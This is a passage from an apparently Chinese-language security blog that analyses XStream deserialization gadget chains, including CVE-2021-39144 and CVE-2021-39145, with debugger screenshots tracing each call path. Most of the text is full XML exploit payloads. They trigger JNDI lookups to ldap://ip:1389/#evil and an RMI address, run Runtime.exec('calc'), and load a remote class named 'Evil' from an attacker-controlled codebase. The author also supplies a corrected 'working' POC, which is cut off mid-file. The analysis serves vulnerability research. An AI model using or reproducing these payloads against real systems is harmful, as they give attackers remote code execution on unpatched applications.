&lt;elementDeclaredTypes/&gt;</span><br><span class="line">                      &lt;/outer-class&gt;</span><br><span class="line">                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                  &lt;/accessors&gt;</span><br><span class="line">                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;</span><br><span class="line">                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;</span><br><span class="line">                  &lt;dynamicWrapper&gt;false&lt;/dynamicWrapper&gt;</span><br><span class="line">                &lt;/bodyBuilder&gt;</span><br><span class="line">                &lt;isOneWay&gt;false&lt;/isOneWay&gt;</span><br><span class="line">              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/stubHandlers&gt;</span><br><span class="line">          &lt;clientConfig&gt;false&lt;/clientConfig&gt;</span><br><span class="line">        &lt;/databinding&gt;</span><br><span class="line">        &lt;methodHandlers&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">              &lt;owner reference=&#x27;../../../..&#x27;/&gt;</span><br><span class="line">              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">              &lt;isVoid&gt;false&lt;/isVoid&gt;</span><br><span class="line">              &lt;isOneway&gt;false&lt;/isOneway&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/methodHandlers&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;string&gt;ldap://ip:1389/#evil&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>作者属性给的太全，这里简化了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;</span><br><span class="line">        &lt;owner/&gt;</span><br><span class="line">        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;</span><br><span class="line">          &lt;stubHandlers&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/method&gt;</span><br><span class="line">              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;</span><br><span class="line">                  &lt;indices&gt;</span><br><span class="line">                    &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                  &lt;/indices&gt;</span><br><span class="line">                  &lt;getters&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;</span><br><span class="line">                  &lt;/getters&gt;</span><br><span class="line">                  &lt;accessors&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;</span><br><span class="line">                        &lt;field&gt;</span><br><span class="line">                          &lt;name&gt;hash&lt;/name&gt;</span><br><span class="line">                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                        &lt;/field&gt;</span><br><span class="line">                      &lt;/val_-getter&gt;</span><br><span class="line">                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;java.lang.String&lt;/type&gt;</span><br><span class="line">                        &lt;method&gt;</span><br><span class="line">                          &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;doLookup&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types&gt;</span><br><span class="line">                            &lt;class&gt;java.lang.String&lt;/class&gt;</span><br><span class="line">                          &lt;/parameter-types&gt;</span><br><span class="line">                        &lt;/method&gt;</span><br><span class="line">                      &lt;/val_-setter&gt;</span><br><span class="line">                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                  &lt;/accessors&gt;</span><br><span class="line">                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;</span><br><span class="line">                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;</span><br><span class="line">                &lt;/bodyBuilder&gt;</span><br><span class="line">              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/stubHandlers&gt;</span><br><span class="line">        &lt;/databinding&gt;</span><br><span class="line">        &lt;methodHandlers&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">              &lt;owner reference=&#x27;../../../..&#x27;/&gt;</span><br><span class="line">              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/methodHandlers&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;string&gt;rmi://127.0.0.1:1097/Object&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这里同样是PriorityQueue的readObject作为入口点：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131407434.png" alt="image-20230413140718221"></p>
<p>队列存入两个元素，然后调用heapify方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131408740.png" alt="image-20230413140806643"></p>
<p>获取队列第一个元素，即动态代理对象，然后调用siftDown方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131408602.png" alt="image-20230413140859498"></p>
<p>比较器为null，调用siftDownComparable方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131410869.png" alt="image-20230413141016786"></p>
<p>获取队列第二个元素，然后调用第一个元素（动态代理对象）的compareTo方法，这里会执行到SEIStub的invoke方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131412550.png" alt="image-20230413141221438"></p>
<p>检验输入，然后获取compareTo方法的方法处理器MethodHandler，执行方法处理器的invoke方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131414611.png" alt="image-20230413141409498"></p>
<p>invoke方法又调用重载invoke方法，在重载invoke方法里将compareTo方法（对应xml的SyncMethodHandler下的method）包装成JavaCallInfo，然后调用DatabindingImpl的serializeRequest方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131417741.png" alt="image-20230413141728648"></p>
<p>获取compareTo方法的StubHandler，然后调用createRequestPacket方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131419017.png" alt="image-20230413141901924"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131419829.png" alt="image-20230413141940735"></p>
<p>在createRequestPacket方法中，调用createMessage方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131420259.png" alt="image-20230413142007155"></p>
<p>调用this.bulid在方法参数传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131421161.png" alt="image-20230413142136083"></p>
<p>创建一个Object实例赋值给bean临时变量，然后调用getters数组第一个元素的get方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131423442.png" alt="image-20230413142344381"></p>
<p>get方法直接返回方法参数。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131421161.png" alt="image-20230413142136083"></p>
<p>接着调用set方法，第一个为Object实例，第二个rmi字符串。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131427718.png" alt="image-20230413142730610"></p>
<p>继续调用set方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131429638.png" alt="image-20230413142927546"></p>
<p>为方法设置可见性，然后反射调用该方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131430407.png" alt="image-20230413143055343"></p>
<p>JNDI注入点。</p>
<h2 id="CVE-2021-39144"><a href="#CVE-2021-39144" class="headerlink" title="CVE-2021-39144"></a>CVE-2021-39144</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成RCE，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;</span><br><span class="line">        &lt;active&gt;true&lt;/active&gt;</span><br><span class="line">        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;</span><br><span class="line">        &lt;probes&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method&gt;</span><br><span class="line">              &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">              &lt;/parameter-types&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            &lt;sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;</span><br><span class="line">              &lt;implementing__method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Runtime&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;exec&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.String&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/implementing__method&gt;</span><br><span class="line">            &lt;/sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/probes&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>直接哭了，这么短的链好久没见到了，之前XStream将命令执行的ProcessBuilder加入了黑名单，就是Runtime没加，这次就是用Runtime执行的命令。</p>
<p>这里直接来到invoke，同样还是compareTo方法触发的invoke：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131443932.png" alt="image-20230413144356849"></p>
<p>在invoke方法中，判断compareTo所属的类是否与providerType属性相同，相同的话进入else分支调用triggerProbe方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131446934.png" alt="image-20230413144606848"></p>
<p>获取compareTo方法的ProbeSkeleton值，然后调用该值的uncheckedTrigger方法将字符串calc传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131447358.png" alt="image-20230413144751294"></p>
<p>直接执行Runtime的exec方法，完成命令执行。很巧妙的设计。</p>
<h2 id="CVE-2021-39145"><a href="#CVE-2021-39145" class="headerlink" title="CVE-2021-39145"></a>CVE-2021-39145</h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会从远程codebase拉取class，然后实例化类，造成RCE。官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">        &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &amp;#x3C;none&amp;#x3E;&lt;/m__obj&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">        &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">          &lt;bodyParts/&gt;</span><br><span class="line">          &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">            &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">            &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">              &lt;soapPart/&gt;</span><br><span class="line">              &lt;mm&gt;</span><br><span class="line">                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                  &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapBindingEnumeration&#x27;&gt;</span><br><span class="line">                    &lt;homeCtx&gt;</span><br><span class="line">                      &lt;hostname&gt;233.233.233.233&lt;/hostname&gt;</span><br><span class="line">                      &lt;port__number&gt;2333&lt;/port__number&gt;</span><br><span class="line">                      &lt;clnt class=&#x27;com.sun.jndi.ldap.LdapClient&#x27;/&gt;</span><br><span class="line">                    &lt;/homeCtx&gt;</span><br><span class="line">                    &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                    &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                    &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                    &lt;limit&gt;1&lt;/limit&gt;</span><br><span class="line">                    &lt;entries&gt;</span><br><span class="line">                      &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                        &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                        &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;refClassName&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                        &lt;/attributes&gt;</span><br><span class="line">                      &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                    &lt;/entries&gt;</span><br><span class="line">                  &lt;/aliases&gt;</span><br><span class="line">                &lt;/it&gt;</span><br><span class="line">              &lt;/mm&gt;</span><br><span class="line">            &lt;/multiPart&gt;</span><br><span class="line">          &lt;/sm&gt;</span><br><span class="line">        &lt;/message&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>该POC是错的，无法直接运行，而且需要低版本的jdk（我使用的jdk8u181，我一开始使用jdk8u361没有KeyStoreResolver$KeyStoreIterator的aliases），以下是可以运行的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">        &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &amp;#x3C;none&amp;#x3E;&lt;/m__obj&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">        &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">          &lt;bodyParts/&gt;</span><br><span 